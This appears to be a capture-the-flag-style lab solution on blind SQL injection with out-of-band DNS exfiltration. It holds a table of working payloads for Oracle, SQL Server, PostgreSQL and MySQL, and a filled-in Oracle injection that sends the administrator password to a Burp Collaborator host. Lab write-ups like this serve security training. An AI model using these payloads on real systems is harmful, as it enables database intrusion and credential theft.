# Lab: Blind SQL injection with out-of-band data exfiltration

## Lab

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the `password` of the `administrator` user.

To solve the lab, log in as the `administrator` user. 

## Hint

You can find some useful payloads on our SQL injection cheat sheet. 

## Solution

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Now, suppose that the application carries out the same SQL query, but does it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie. The query is still vulnerable to SQL injection, however none of the techniques described so far will work: the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.

The easiest and most reliable way to use out-of-band techniques is using Burp Collaborator. This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to Burp Suite Professional with no configuration required.

The techniques for triggering a DNS query are highly specific to the type of database being used:
|SQL Server |Payload                                                                                                                                        |
|-----------|-----------------------------------------------------------------------------------------------------------------------------------------------|
|Oracle     |<code>SELECT EXTRACTVALUE(xmltype('\<?xml version="1.0" encoding="UTF-8"?>\<!DOCTYPE root [ \<!ENTITY % remote SYSTEM "http://'&#124;&#124;(SELECT YOUR-QUERY-HERE)&#124;&#124;'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual</code>|
|Microsoft  |<code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')</code>|
|PostgreSQL |<code>create OR replace function f() returns void as \$\$ <br /> declare c text;<br />declare p text <br /> begin <br /> SELECT into p (SELECT YOUR-QUERY-HERE); <br /> c := 'copy (SELECT '''') to program ''nslookup \'&#124;&#124;p&#124;&#124;\'.BURP-COLLABORATOR-SUBDOMAIN'''; <br /> execute c; <br /> END; <br /> $$ language plpgsql security definer;<br /> SELECT f();</code>|
|MySQL      |<code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>|


Fuzzing the payloads:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'||(SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.zwz1tw1hc3owwiu588xt4121jspjd8.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual)--'
```

>administrator -  x49qg0lk95ats3cylkuq    